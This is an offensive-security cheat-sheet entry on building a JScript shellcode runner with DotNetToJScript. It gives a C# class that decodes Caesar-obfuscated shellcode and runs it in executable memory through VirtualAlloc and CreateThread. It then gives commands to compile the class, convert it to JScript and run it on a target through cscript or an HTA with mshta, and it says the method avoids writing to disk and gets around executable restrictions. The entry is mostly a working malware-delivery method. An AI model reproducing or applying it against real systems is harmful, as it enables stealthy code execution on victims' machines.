# 07.04 Custom JScript Shellcode Runner

> JScript shellcode runner via DotNetToJScript — loads a .NET assembly that runs shellcode in-process.

## Overview

DotNetToJScript (James Forshaw) converts a compiled .NET assembly into a JScript stub that, when run via cscript/wscript or in an HTA, loads the .NET assembly entirely in memory and invokes its entry point. Combine with a C# shellcode runner assembly for a script-based delivery vector that doesn't drop binaries to disk. Bypasses many script-only restrictions (e.g., 'no .exe allowed').

## Steps

- **Step 1** - Write a C# shellcode runner assembly (must extend ServicedComponent).
- **Step 2** - Compile to DLL.
- **Step 3** - Run DotNetToJScript to convert.
- **Step 4** - Deliver the resulting .js or .hta to target.
- **Step 5** - Execute via cscript / wscript / mshta.

## Commands

### Get DotNetToJScript

```bash
git clone https://github.com/tyranid/DotNetToJScript
cd DotNetToJScript
# Build with msbuild or download release
wget https://github.com/tyranid/DotNetToJScript/releases/latest/download/DotNetToJScript_v3.0_Net4.zip
unzip DotNetToJScript_v3.0_Net4.zip
```

### C# runner that extends ServicedComponent

```csharp
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Net;

public class ShellcodeRunner : ServicedComponent
{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public ShellcodeRunner()
    {
        // Caesar-decode embedded array
        byte[] sc = new byte[] { /* Caesar-encoded shellcode bytes */ };
        for (int i = 0; i < sc.Length; i++) sc[i] = (byte)((sc[i] + 7) & 0xFF);

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
```

### Compile and convert

```bash
# Compile DLL
csc /target:library /out:runner.dll runner.cs
# Convert to JScript
DotNetToJScript.exe runner.dll -l=JScript -c=ShellcodeRunner > runner.js
# Output is JScript that loads the assembly when run with cscript
```

### Execute on target

```cmd
cscript.exe //E:JScript runner.js
REM Or via mshta if you embed in HTA:
mshta.exe runner.hta
```

### HTA wrapper

```html
<html><head>
<script language="JScript">
<!-- paste content of runner.js here -->
window.close();
</script>
</head></html>
```
